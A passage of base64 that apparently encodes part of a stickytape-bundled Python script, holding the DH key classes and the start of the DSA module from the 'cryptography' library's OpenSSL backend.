EwpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChnWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGlmIHFbMF0gPT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEw6XHJcbiAgICAgICAgICAgIHFfdmFsID0gTm9uZVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHFfdmFsID0gc2VsZi5fYmFja2VuZC5fYm5fdG9faW50KHFbMF0pXHJcbiAgICAgICAgcHViX2tleSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgcHJpdl9rZXkgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5ESF9nZXQwX2tleShzZWxmLl9kaF9jZGF0YSwgcHViX2tleSwgcHJpdl9rZXkpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwdWJfa2V5WzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocHJpdl9rZXlbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgcmV0dXJuIGRoLkRIUHJpdmF0ZU51bWJlcnMoXHJcbiAgICAgICAgICAgIHB1YmxpY19udW1iZXJzPWRoLkRIUHVibGljTnVtYmVycyhcclxuICAgICAgICAgICAgICAgIHBhcmFtZXRlcl9udW1iZXJzPWRoLkRIUGFyYW1ldGVyTnVtYmVycyhcclxuICAgICAgICAgICAgICAgICAgICBwPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChwWzBdKSxcclxuICAgICAgICAgICAgICAgICAgICBnPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChnWzBdKSxcclxuICAgICAgICAgICAgICAgICAgICBxPXFfdmFsLFxyXG4gICAgICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgICAgIHk9c2VsZi5fYmFja2VuZC5fYm5fdG9faW50KHB1Yl9rZXlbMF0pLFxyXG4gICAgICAgICAgICApLFxyXG4gICAgICAgICAgICB4PXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChwcml2X2tleVswXSksXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiBleGNoYW5nZShzZWxmLCBwZWVyX3B1YmxpY19rZXk6IGRoLkRIUHVibGljS2V5KSAtPiBieXRlczpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShwZWVyX3B1YmxpY19rZXksIF9ESFB1YmxpY0tleSk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigicGVlcl9wdWJsaWNfa2V5IG11c3QgYmUgYSBESFB1YmxpY0tleSIpXHJcblxyXG4gICAgICAgIGN0eCA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfUEtFWV9DVFhfbmV3KFxyXG4gICAgICAgICAgICBzZWxmLl9ldnBfcGtleSwgc2VsZi5fYmFja2VuZC5fZmZpLk5VTExcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChjdHggIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgY3R4ID0gc2VsZi5fYmFja2VuZC5fZmZpLmdjKGN0eCwgc2VsZi5fYmFja2VuZC5fbGliLkVWUF9QS0VZX0NUWF9mcmVlKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfUEtFWV9kZXJpdmVfaW5pdChjdHgpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuRVZQX1BLRVlfZGVyaXZlX3NldF9wZWVyKFxyXG4gICAgICAgICAgICBjdHgsIHBlZXJfcHVibGljX2tleS5fZXZwX3BrZXlcclxuICAgICAgICApXHJcbiAgICAgICAgIyBJbnZhbGlkIGtleCBlcnJvcnMgaGVyZSBpbiBPcGVuU1NMIDMuMCBiZWNhdXNlIGNoZWNrcyB3ZXJlIG1vdmVkXHJcbiAgICAgICAgIyB0byBFVlBfUEtFWV9kZXJpdmVfc2V0X3BlZXJcclxuICAgICAgICBzZWxmLl9leGNoYW5nZV9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAga2V5bGVuID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygic2l6ZV90ICoiKVxyXG4gICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5FVlBfUEtFWV9kZXJpdmUoXHJcbiAgICAgICAgICAgIGN0eCwgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsIGtleWxlblxyXG4gICAgICAgIClcclxuICAgICAgICAjIEludmFsaWQga2V4IGVycm9ycyBoZXJlIGluIE9wZW5TU0wgPCAzXHJcbiAgICAgICAgc2VsZi5fZXhjaGFuZ2VfYXNzZXJ0KHJlcyA9PSAxKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoa2V5bGVuWzBdID4gMClcclxuICAgICAgICBidWYgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJ1bnNpZ25lZCBjaGFyW10iLCBrZXlsZW5bMF0pXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkVWUF9QS0VZX2Rlcml2ZShjdHgsIGJ1Ziwga2V5bGVuKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgICAgIGtleSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5idWZmZXIoYnVmLCBrZXlsZW5bMF0pWzpdXHJcbiAgICAgICAgcGFkID0gc2VsZi5fa2V5X3NpemVfYnl0ZXMgLSBsZW4oa2V5KVxyXG5cclxuICAgICAgICBpZiBwYWQgPiAwOlxyXG4gICAgICAgICAgICBrZXkgPSAoYiJcXHgwMCIgKiBwYWQpICsga2V5XHJcblxyXG4gICAgICAgIHJldHVybiBrZXlcclxuXHJcbiAgICBkZWYgX2V4Y2hhbmdlX2Fzc2VydChzZWxmLCBvazogYm9vbCkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3Qgb2s6XHJcbiAgICAgICAgICAgIGVycm9yc193aXRoX3RleHQgPSBzZWxmLl9iYWNrZW5kLl9jb25zdW1lX2Vycm9yc193aXRoX3RleHQoKVxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkVycm9yIGNvbXB1dGluZyBzaGFyZWQga2V5LiIsXHJcbiAgICAgICAgICAgICAgICBlcnJvcnNfd2l0aF90ZXh0LFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIHB1YmxpY19rZXkoc2VsZikgLT4gZGguREhQdWJsaWNLZXk6XHJcbiAgICAgICAgZGhfY2RhdGEgPSBfZGhfcGFyYW1zX2R1cChzZWxmLl9kaF9jZGF0YSwgc2VsZi5fYmFja2VuZClcclxuICAgICAgICBwdWJfa2V5ID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygiQklHTlVNICoqIilcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLl9saWIuREhfZ2V0MF9rZXkoXHJcbiAgICAgICAgICAgIHNlbGYuX2RoX2NkYXRhLCBwdWJfa2V5LCBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTFxyXG4gICAgICAgIClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHB1Yl9rZXlbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgcHViX2tleV9kdXAgPSBzZWxmLl9iYWNrZW5kLl9saWIuQk5fZHVwKHB1Yl9rZXlbMF0pXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwdWJfa2V5X2R1cCAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkRIX3NldDBfa2V5KFxyXG4gICAgICAgICAgICBkaF9jZGF0YSwgcHViX2tleV9kdXAsIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMXHJcbiAgICAgICAgKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgZXZwX3BrZXkgPSBzZWxmLl9iYWNrZW5kLl9kaF9jZGF0YV90b19ldnBfcGtleShkaF9jZGF0YSlcclxuICAgICAgICByZXR1cm4gX0RIUHVibGljS2V5KHNlbGYuX2JhY2tlbmQsIGRoX2NkYXRhLCBldnBfcGtleSlcclxuXHJcbiAgICBkZWYgcGFyYW1ldGVycyhzZWxmKSAtPiBkaC5ESFBhcmFtZXRlcnM6XHJcbiAgICAgICAgcmV0dXJuIF9kaF9jZGF0YV90b19wYXJhbWV0ZXJzKHNlbGYuX2RoX2NkYXRhLCBzZWxmLl9iYWNrZW5kKVxyXG5cclxuICAgIGRlZiBwcml2YXRlX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IHNlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBzZXJpYWxpemF0aW9uLlByaXZhdGVGb3JtYXQsXHJcbiAgICAgICAgZW5jcnlwdGlvbl9hbGdvcml0aG06IHNlcmlhbGl6YXRpb24uS2V5U2VyaWFsaXphdGlvbkVuY3J5cHRpb24sXHJcbiAgICApIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIGZvcm1hdCBpcyBub3Qgc2VyaWFsaXphdGlvbi5Qcml2YXRlRm9ybWF0LlBLQ1M4OlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkRIIHByaXZhdGUga2V5cyBzdXBwb3J0IG9ubHkgUEtDUzggc2VyaWFsaXphdGlvbiJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGlmIG5vdCBzZWxmLl9iYWNrZW5kLl9saWIuQ3J5cHRvZ3JhcGh5X0hBU19FVlBfUEtFWV9ESFg6XHJcbiAgICAgICAgICAgIHEgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgICAgICBzZWxmLl9iYWNrZW5kLl9saWIuREhfZ2V0MF9wcWcoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9kaF9jZGF0YSxcclxuICAgICAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICAgICAgcSxcclxuICAgICAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLFxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGlmIHFbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEw6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICAgICAiREggWDkuNDIgc2VyaWFsaXphdGlvbiBpcyBub3Qgc3VwcG9ydGVkIixcclxuICAgICAgICAgICAgICAgICAgICBfUmVhc29ucy5VTlNVUFBPUlRFRF9TRVJJQUxJWkFUSU9OLFxyXG4gICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5fcHJpdmF0ZV9rZXlfYnl0ZXMoXHJcbiAgICAgICAgICAgIGVuY29kaW5nLFxyXG4gICAgICAgICAgICBmb3JtYXQsXHJcbiAgICAgICAgICAgIGVuY3J5cHRpb25fYWxnb3JpdGhtLFxyXG4gICAgICAgICAgICBzZWxmLFxyXG4gICAgICAgICAgICBzZWxmLl9ldnBfcGtleSxcclxuICAgICAgICAgICAgc2VsZi5fZGhfY2RhdGEsXHJcbiAgICAgICAgKVxyXG5cclxuXHJcbmNsYXNzIF9ESFB1YmxpY0tleShkaC5ESFB1YmxpY0tleSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCBkaF9jZGF0YSwgZXZwX3BrZXkpOlxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQgPSBiYWNrZW5kXHJcbiAgICAgICAgc2VsZi5fZGhfY2RhdGEgPSBkaF9jZGF0YVxyXG4gICAgICAgIHNlbGYuX2V2cF9wa2V5ID0gZXZwX3BrZXlcclxuICAgICAgICBzZWxmLl9rZXlfc2l6ZV9iaXRzID0gX2dldF9kaF9udW1fYml0cyhzZWxmLl9iYWNrZW5kLCBzZWxmLl9kaF9jZGF0YSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2tleV9zaXplX2JpdHNcclxuXHJcbiAgICBkZWYgcHVibGljX251bWJlcnMoc2VsZikgLT4gZGguREhQdWJsaWNOdW1iZXJzOlxyXG4gICAgICAgIHAgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIGcgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHEgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5ESF9nZXQwX3BxZyhzZWxmLl9kaF9jZGF0YSwgcCwgcSwgZylcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChnWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIGlmIHFbMF0gPT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEw6XHJcbiAgICAgICAgICAgIHFfdmFsID0gTm9uZVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHFfdmFsID0gc2VsZi5fYmFja2VuZC5fYm5fdG9faW50KHFbMF0pXHJcbiAgICAgICAgcHViX2tleSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLkRIX2dldDBfa2V5KFxyXG4gICAgICAgICAgICBzZWxmLl9kaF9jZGF0YSwgcHViX2tleSwgc2VsZi5fYmFja2VuZC5fZmZpLk5VTExcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwdWJfa2V5WzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHJldHVybiBkaC5ESFB1YmxpY051bWJlcnMoXHJcbiAgICAgICAgICAgIHBhcmFtZXRlcl9udW1iZXJzPWRoLkRIUGFyYW1ldGVyTnVtYmVycyhcclxuICAgICAgICAgICAgICAgIHA9c2VsZi5fYmFja2VuZC5fYm5fdG9faW50KHBbMF0pLFxyXG4gICAgICAgICAgICAgICAgZz1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQoZ1swXSksXHJcbiAgICAgICAgICAgICAgICBxPXFfdmFsLFxyXG4gICAgICAgICAgICApLFxyXG4gICAgICAgICAgICB5PXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChwdWJfa2V5WzBdKSxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHBhcmFtZXRlcnMoc2VsZikgLT4gZGguREhQYXJhbWV0ZXJzOlxyXG4gICAgICAgIHJldHVybiBfZGhfY2RhdGFfdG9fcGFyYW1ldGVycyhzZWxmLl9kaF9jZGF0YSwgc2VsZi5fYmFja2VuZClcclxuXHJcbiAgICBkZWYgcHVibGljX2J5dGVzKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZW5jb2Rpbmc6IHNlcmlhbGl6YXRpb24uRW5jb2RpbmcsXHJcbiAgICAgICAgZm9ybWF0OiBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdCxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgZm9ybWF0IGlzIG5vdCBzZXJpYWxpemF0aW9uLlB1YmxpY0Zvcm1hdC5TdWJqZWN0UHVibGljS2V5SW5mbzpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICJESCBwdWJsaWMga2V5cyBzdXBwb3J0IG9ubHkgIlxyXG4gICAgICAgICAgICAgICAgIlN1YmplY3RQdWJsaWNLZXlJbmZvIHNlcmlhbGl6YXRpb24iXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgaWYgbm90IHNlbGYuX2JhY2tlbmQuX2xpYi5DcnlwdG9ncmFwaHlfSEFTX0VWUF9QS0VZX0RIWDpcclxuICAgICAgICAgICAgcSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5ESF9nZXQwX3BxZyhcclxuICAgICAgICAgICAgICAgIHNlbGYuX2RoX2NkYXRhLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgICAgICBxLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgaWYgcVswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFVuc3VwcG9ydGVkQWxnb3JpdGhtKFxyXG4gICAgICAgICAgICAgICAgICAgICJESCBYOS40MiBzZXJpYWxpemF0aW9uIGlzIG5vdCBzdXBwb3J0ZWQiLFxyXG4gICAgICAgICAgICAgICAgICAgIF9SZWFzb25zLlVOU1VQUE9SVEVEX1NFUklBTElaQVRJT04sXHJcbiAgICAgICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9wdWJsaWNfa2V5X2J5dGVzKFxyXG4gICAgICAgICAgICBlbmNvZGluZywgZm9ybWF0LCBzZWxmLCBzZWxmLl9ldnBfcGtleSwgTm9uZVxyXG4gICAgICAgIClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvYmFja2VuZHMvb3BlbnNzbC9kc2EucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuZXhjZXB0aW9ucyBpbXBvcnQgSW52YWxpZFNpZ25hdHVyZVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC51dGlscyBpbXBvcnQgKFxyXG4gICAgX2NhbGN1bGF0ZV9kaWdlc3RfYW5kX2FsZ29yaXRobSxcclxuKVxyXG5mcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgaGFzaGVzLCBzZXJpYWxpemF0aW9uXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMgaW1wb3J0IChcclxuICAgIGRzYSxcclxuICAgIHV0aWxzIGFzIGFzeW1fdXRpbHMsXHJcbilcclxuXHJcblxyXG5pZiB0eXBpbmcuVFlQRV9DSEVDS0lORzpcclxuICAgIGZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5iYWNrZW5kcy5vcGVuc3NsLmJhY2tlbmQgaW1wb3J0IEJhY2tlbmRcclxuXHJcblxyXG5kZWYgX2RzYV9zaWdfc2lnbihcclxuICAgIGJhY2tlbmQ6ICJCYWNrZW5kIiwgcHJpdmF0ZV9rZXk6ICJfRFNBUHJpdmF0ZUtleSIsIGRhdGE6IGJ5dGVzXHJcbikgLT4gYnl0ZXM6XHJcbiAgICBzaWdfYnVmX2xlbiA9IGJhY2tlbmQuX2xpYi5EU0Ffc2l6ZShwcml2YXRlX2tleS5fZHNhX2NkYXRhKVxyXG4gICAgc2lnX2J1ZiA9IGJhY2tlbmQuX2ZmaS5uZXcoInVuc2lnbmVkIGNoYXJbXSIsIHNpZ19idWZfbGVuKVxyXG4gICAgYnVmbGVuID0gYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgaW50ICoiKVxyXG5cclxuICAgICMgVGhlIGZpcnN0IHBhcmFtZXRlciBwYXNzZWQgdG8gRFNBX3NpZ24gaXMgdW51c2VkIGJ5IE9wZW5TU0wgYnV0XHJcbiAgICAjIG11c3QgYmUgYW4gaW50ZWdlci5cclxuICAgIHJlcyA9IGJhY2tlbmQuX2xpYi5EU0Ffc2lnbihcclxuICAgICAgICAwLCBkYXRhLCBsZW4oZGF0YSksIHNpZ19idWYsIGJ1ZmxlbiwgcHJpdmF0ZV9rZXkuX2RzYV9jZGF0YVxyXG4gICAgKVxyXG4gICAgYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQoYnVmbGVuWzBdKVxyXG5cclxuICAgIHJldHVybiBiYWNrZW5kLl9mZmkuYnVmZmVyKHNpZ19idWYpWzogYnVmbGVuWzBdXVxyXG5cclxuXHJcbmRlZiBfZHNhX3NpZ192ZXJpZnkoXHJcbiAgICBiYWNrZW5kOiAiQmFja2VuZCIsXHJcbiAgICBwdWJsaWNfa2V5OiAiX0RTQVB1YmxpY0tleSIsXHJcbiAgICBzaWduYXR1cmU6IGJ5dGVzLFxyXG4gICAgZGF0YTogYnl0ZXMsXHJcbikgLT4gTm9uZTpcclxuICAgICMgVGhlIGZpcnN0IHBhcmFtZXRlciBwYXNzZWQgdG8gRFNBX3ZlcmlmeSBpcyB1bnVzZWQgYnkgT3BlblNTTCBidXRcclxuICAgICMgbXVzdCBiZSBhbiBpbnRlZ2VyLlxyXG4gICAgcmVzID0gYmFja2VuZC5fbGliLkRTQV92ZXJpZnkoXHJcbiAgICAgICAgMCwgZGF0YSwgbGVuKGRhdGEpLCBzaWduYXR1cmUsIGxlbihzaWduYXR1cmUpLCBwdWJsaWNfa2V5Ll9kc2FfY2RhdGFcclxuICAgIClcclxuXHJcbiAgICBpZiByZXMgIT0gMTpcclxuICAgICAgICBiYWNrZW5kLl9jb25zdW1lX2Vycm9ycygpXHJcbiAgICAgICAgcmFpc2UgSW52YWxpZFNpZ25hdHVyZVxyXG5cclxuXHJcbmNsYXNzIF9EU0FQYXJhbWV0ZXJzKGRzYS5EU0FQYXJhbWV0ZXJzKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBiYWNrZW5kOiAiQmFja2VuZCIsIGRzYV9jZGF0YSk6XHJcbiAgICAgICAgc2VsZi5fYmFja2VuZCA9IGJhY2tlbmRcclxuICAgICAgICBzZWxmLl9kc2FfY2RhdGEgPSBkc2FfY2RhdGFcclxuXHJcbiAgICBkZWYgcGFyYW1ldGVyX251bWJlcnMoc2VsZikgLT4gZHNhLkRTQVBhcmFtZXRlck51bWJlcnM6XHJcbiAgICAgICAgcCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgcSA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgZyA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLkRTQV9nZXQwX3BxZyhzZWxmLl9kc2FfY2RhdGEsIHAsIHEsIGcpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocVswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KGdbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgcmV0dXJuIGRzYS5EU0FQYXJhbWV0ZXJOdW1iZXJzKFxyXG4gICAgICAgICAgICBwPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChwWzBdKSxcclxuICAgICAgICAgICAgcT1zZWxmLl9iYWNrZW5kLl9ibl90b19pbnQocVswXSksXHJcbiAgICAgICAgICAgIGc9c2VsZi5fYmFja2VuZC5fYm5fdG9faW50KGdbMF0pLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgZ2VuZXJhdGVfcHJpdmF0ZV9rZXkoc2VsZikgLT4gZHNhLkRTQVByaXZhdGVLZXk6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuZ2VuZXJhdGVfZHNhX3ByaXZhdGVfa2V5KHNlbGYpXHJcblxyXG5cclxuY2xhc3MgX0RTQVByaXZhdGVLZXkoZHNhLkRTQVByaXZhdGVLZXkpOlxyXG4gICAgX2tleV9zaXplOiBpbnRcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCBkc2FfY2RhdGEsIGV2cF9wa2V5KTpcclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG4gICAgICAgIHNlbGYuX2RzYV9jZGF0YSA9IGRzYV9jZGF0YVxyXG4gICAgICAgIHNlbGYuX2V2cF9wa2V5ID0gZXZwX3BrZXlcclxuXHJcbiAgICAgICAgcCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5fbGliLkRTQV9nZXQwX3BxZyhcclxuICAgICAgICAgICAgZHNhX2NkYXRhLCBwLCBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTCwgc2VsZi5fYmFja2VuZC5fZmZpLk5VTExcclxuICAgICAgICApXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwWzBdICE9IGJhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2tleV9zaXplID0gc2VsZi5fYmFja2VuZC5fbGliLkJOX251bV9iaXRzKHBbMF0pXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemUoc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9rZXlfc2l6ZVxyXG5cclxuICAgIGRlZiBwcml2YXRlX251bWJlcnMoc2VsZikgLT4gZHNhLkRTQVByaXZhdGVOdW1iZXJzOlxyXG4gICAgICAgIHAgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHEgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIGcgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHB1Yl9rZXkgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHByaXZfa2V5ID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygiQklHTlVNICoqIilcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLl9saWIuRFNBX2dldDBfcHFnKHNlbGYuX2RzYV9jZGF0YSwgcCwgcSwgZylcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChxWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZ1swXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLl9saWIuRFNBX2dldDBfa2V5KHNlb